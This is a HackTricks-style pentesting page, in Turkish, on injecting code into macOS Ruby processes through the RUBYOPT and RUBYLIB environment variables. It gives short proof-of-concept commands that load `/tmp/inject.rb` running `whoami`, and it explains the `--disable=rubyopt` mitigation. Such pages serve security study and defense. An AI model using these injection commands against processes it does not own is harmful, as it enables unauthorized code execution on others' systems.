# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby, bir scripti çalıştırmadan önce desteklenen command-line switch'lerini `RUBYOPT` environment variable'ından parse eder. Ruby, `RUBYOPT` içindeki `-e` aracılığıyla code execution yapılmasını reddeder; ancak `-I` bir library-search directory'sini öne ekleyebilir ve `-r` bir library'yi require edebilir. Bu nedenle, attacker-controlled environment variables ile Ruby'yi başlatan bir process'in attacker-controlled Ruby code yüklemesi sağlanabilir.<sup>[[1]](#references)</sup>

`/tmp/inject.rb` oluşturun:
```ruby:inject.rb
puts `whoami`
```
`hello.rb` gibi benign bir Ruby script'i oluşturun:
```ruby:hello.rb
puts 'Hello, World!'
```
Kontrollü bir `RUBYOPT` değeriyle çalıştırın:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Bu davranışı devre dışı bırakmak için `--disable=rubyopt` (veya `--disable-rubyopt`) seçeneğini script adından **önce** belirtin:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
`hello.rb` sonrasında yazılan bir seçenek, script'e `ARGV` içinde aktarılır; Ruby'nin `RUBYOPT` için yaptığı önceki işlemeyi devre dışı bırakmaz.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## RUBYLIB

`RUBYOPT` içinde load directory'nin başına `-I` eklemek yerine, ayrı `RUBYLIB` environment variable'ı Ruby'nin `$LOAD_PATH` değerine directory'ler ekler. `RUBYOPT=-r<module>` ile birlikte kullanıldığında, `RUBYOPT` içinde `-I` kullanmaya gerek kalmadan attacker code yükler:<sup>[[1]](#references)</sup>
```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```
## References

- [1] [Ruby dokümantasyonu - Ruby komut satırı seçenekleri](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
